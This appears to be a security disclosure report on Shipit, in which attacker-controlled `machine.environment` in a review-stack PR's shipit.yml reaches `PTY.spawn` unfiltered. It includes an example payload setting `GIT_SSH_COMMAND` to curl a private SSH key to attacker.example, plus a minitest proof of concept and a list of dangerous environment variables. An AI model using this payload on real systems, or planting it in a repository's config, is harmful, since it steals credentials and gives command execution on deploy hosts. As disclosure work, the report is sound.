### Title
`shipit.yml` `machine.environment` is merged into task/deploy commands with no key whitelist, letting an `allow_all` review-stack PR set `GIT_SSH_COMMAND` and any other env var reaching `PTY.spawn` - (File: `app/models/shipit/deploy_spec.rb`, `lib/shipit/task_commands.rb`, `lib/shipit/command.rb`)

### Summary
`DeploySpec#machine_env` reads the `machine.environment` key straight out of the checked-out `shipit.yml` with no allow-list, unlike `deploy.variables`/`rollback.variables`/task `variables`, which are all funneled through `EnvironmentVariables#permit`. For an `allow_all` review stack, the `shipit.yml` that is parsed is the one checked out from the attacker's own PR branch, so an attacker-controlled `machine.environment.GIT_SSH_COMMAND` value flows unmodified into `TaskCommands#env` → `Command#unbundled_env` → `PTY.spawn`, giving the attacker control of an environment variable that git itself will treat as an ssh replacement command during any subsequent fetch/clone in that same environment.

### Finding Description
The broken binding is: the set of environment variables that reach `PTY.spawn` for a task step should equal `BASE_ENV ∪ {keys explicitly permitted by `EnvironmentVariables#permit`}`, but in practice it equals `BASE_ENV ∪ stack.env ∪ fixed task keys ∪ deploy_spec.machine_env (unfiltered) ∪ task.env (filtered)`.

Trace:
- `TaskCommands#env` (`lib/shipit/task_commands.rb:33-48`) builds the env for every step run via `Command.new(command_line, env:, chdir:)` (`lib/shipit/task_commands.rb:23-27`) by merging, in order: `super` (base env), `@stack.env`, fixed keys (`SHIPIT_USER`, `EMAIL`, `GIT_COMMITTER_*`, etc.), then `deploy_spec.machine_env`, then `@task.env`.
- `deploy_spec.machine_env` (`app/models/shipit/deploy_spec.rb:69-71`) is `config('machine', 'environment') || {}` with **no call to `EnvironmentVariables.permit`** — contrast with `filter_deploy_envs`/`filter_rollback_envs` (`app/models/shipit/deploy_spec.rb:174-180`) and `TaskDefinition#filter_envs` (`app/models/shipit/task_definition.rb:63-65`), which are the only places `EnvironmentVariables::NotPermitted` can be raised.
- `deploy_spec` is a `DeploySpec::FileSystem.new(@task.working_directory, @stack)` (`lib/shipit/task_commands.rb:13-15`), and `DeploySpec::FileSystem#config_file_path`/`load_config` (`app/models/shipit/deploy_spec/file_system.rb:98-142`) reads `shipit.yml` from the working directory that has just been checked out to the task's target commit — for a review stack task this is the PR head commit from the attacker's own fork/branch.
- `Command#unbundled_env` (`lib/shipit/command.rb:103-105`) merges `@env.stringify_keys` on top of `BASE_ENV`/`PATH` with **no key allow-list at all**, and `Command#start` (`lib/shipit/command.rb:85-101`) calls `PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)`. Because `parse_arguments` keeps each `shipit.yml` step as a single string argument (`lib/shipit/command.rb:227-240`), `PTY.spawn` executes it through `/bin/sh -c "<step>"`, and any git invocation made in that shell (or by a later `fetch`/`clone` reusing the same working directory/environment) will honor `GIT_SSH_COMMAND` if it is present in the process environment.

Attacker request: open a pull request on a repository with `review_stacks_enabled: true` and `provisioning_behavior: allow_all` (`app/models/shipit/repository.rb:50-51`, `docs/review_stacks.md`), whose branch/fork contains a `shipit.yml` such as:
```yaml
machine:
  environment:
    GIT_SSH_COMMAND: "sh -c 'curl attacker.example/$(cat ~/.ssh/id_rsa|base64) ; ssh'"
deploy:
  steps:
    - echo hi
```
This is fully reachable without any authentication: `OpenedHandler` provisions the review stack and triggers `PerformTaskJob` for any PR on an `allow_all` repo (`test/models/shipit/webhooks/handlers/pull_request/opened_handler_test.rb:116-127`). No `EnvironmentVariables::NotPermitted` guard exists for `machine.environment`; `require_permission!`, `force_github_authentication`, and webhook signature checks are irrelevant here because this path is not an authorization bypass on Shipit's own API — it's the deploy spec of the repository itself (attacker's own fork content) being trusted for shell execution, which is exactly what `allow_all` review stacks are documented to do.

### Impact Explanation
Any shell step in that task's execution (`install_dependencies`, `deploy`/task `steps`) runs with `GIT_SSH_COMMAND` set to an attacker-chosen value. The very next `git fetch`/`git clone` performed by Shipit in that same task/host environment (or by the shell step itself if it shells out to git, e.g. for submodules) will execute the attacker's command instead of `ssh`, achieving arbitrary command execution on the Shipit deploy host under the Shipit worker's privileges. This is Critical severity — RCE on the deploy host via `Command`/`PTY.spawn`, matching the stated Immunefi impact class. Because `GIT_SSH_COMMAND` is a generic environment override, the same mechanism also lets the attacker inject `BUNDLE_GEMFILE`, `RUBYOPT`, `NODE_OPTIONS`, `PYTHONSTARTUP`, `LD_PRELOAD` (if inherited), etc., broadening the exploit beyond git specifically. This is scoped to review-stack tasks of the same repository (no cross-tenant/other-repository write is demonstrated here), but any subsequent task on that same host that shares the process environment or working directory is at risk if the host process itself doesn't get killed between tasks.

### Likelihood Explanation
Preconditions: the target repository must have `review_stacks_enabled: true` and `provisioning_behavior: allow_all` — a documented, supported, and apparently common configuration (`docs/review_stacks.md` recommends "Allow All" as "most likely"). No Shipit credentials, session, or GitHub App secret is required: the attacker only needs to open a PR (or push to their own fork/branch) containing a crafted `shipit.yml`. Cost is trivial and fully repeatable — every new/updated PR re-triggers task execution with the attacker's `shipit.yml`.

### Recommendation
Route `DeploySpec#machine_env` (and any other unfiltered config-derived env, e.g. task/step env drawn straight from `shipit.yml`) through an allow-list mechanism analogous to `EnvironmentVariables#permit`, or explicitly reject/strip well-known dangerous variable names (`GIT_SSH_COMMAND`, `LD_PRELOAD`, `BUNDLE_GEMFILE`, `RUBYOPT`, etc.) before merging into `TaskCommands#env`. At minimum, `Command#unbundled_env` should enforce a deny-list/allow-list on `@env` keys for the class of interpreter/tool-affecting variables, particularly for review-stack tasks whose `shipit.yml` originates from unprivileged, attacker-controlled PR content.

### Proof of Concept
minitest plan (`test/unit/task_commands_test.rb` or new `test/unit/deploy_spec_machine_env_test.rb`):
```ruby
test "#env passes through unfiltered machine.environment including GIT_SSH_COMMAND" do
  repository = shipit_repositories(:shipit)
  repository.update!(review_stacks_enabled: true, provisioning_behavior: 'allow_all')
  stack = create_review_stack_from_pr_with_shipit_yml(<<~YAML)
    machine:
      environment:
        GIT_SSH_COMMAND: "touch /tmp/pwned"
    deploy:
      steps:
        - echo hi
  YAML
  task = stack.tasks.create!(...)
  commands = TaskCommands.new(task)

  # Binding under test, both sides:
  assert_equal "touch /tmp/pwned", commands.env["GIT_SSH_COMMAND"]

  command = commands.perform.first
  assert_equal "touch /tmp/pwned", command.env["GIT_SSH_COMMAND"]
  assert_equal "touch /tmp/pwned", command.unbundled_env["GIT_SSH_COMMAND"]
  # Contrast with the allow-listed path, which would raise:
  assert_raises(Shipit::EnvironmentVariables::NotPermitted) do
    stack.deploy_spec.filter_deploy_envs("GIT_SSH_COMMAND" => "touch /tmp/pwned")
  end
end
```
This demonstrates that `machine.environment` values bypass the `EnvironmentVariables::NotPermitted` allow-list that protects `deploy.variables`/`rollback.variables`/task `variables`, and reach the `PTY.spawn` environment unmodified.     def start(&block)
      return if @started

      @control_block = block
      @out = @pid = nil
      FileUtils.mkdir_p(@chdir)
      begin
        @out, child_in, @pid = PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)

      rescue Errno::ENOENT
        raise NotFound, "#{Shellwords.split(interpolated_arguments.first).first}: command not found"
      rescue Errno::EACCES
        raise Denied, "#{Shellwords.split(interpolated_arguments.first).first}: Permission denied"
      end
      @started = true
      self
    end

shipit-engine support three distinct behaviors for determining which Pull Requests should be considered for Review Stack creation.

1. "Allow All" - shipit-engine will create a Review Stack for every new Pull Requests.
1. "Allow With Label" - when creating or updating a Pull Request, the user must add a label matching the `Shipit::Repository`'s "provisioning_label" attribute in order for shipit-engine to dynamically create/manage a Review Stack - an opt-in strategy.
1. "Prevent With Label" - when creating or updating a Pull Request, the user must add a label matching the `Shipit::Repository`'s "provisoining_label" attribute in order to **prevent** shipit-engine from dynamically creating/managing a Review Stack - an opt-out strategy.
